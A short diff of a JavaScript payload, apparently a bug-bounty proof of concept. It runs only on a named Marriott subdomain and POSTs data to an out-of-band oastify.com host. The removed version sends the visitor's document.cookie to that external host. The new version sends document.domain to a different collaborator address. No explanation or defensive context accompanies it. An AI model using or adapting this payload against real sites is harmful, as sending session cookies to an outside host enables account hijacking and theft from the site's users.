@@ -1,7 +1,7 @@
 if (document.domain == "cruise-with-points.marriott.com") {
-  fetch('https://gxhrtdizdrzawp5h4hgtb1hvum0co1.oastify.com', {
+  fetch('https://unlcfz8eokmjszf1ff83te4gs7yxmm.oastify.com', {
   method: 'POST',
   mode: 'no-cors',
-  body:document.cookie
+  body:document.domain
 });
 }
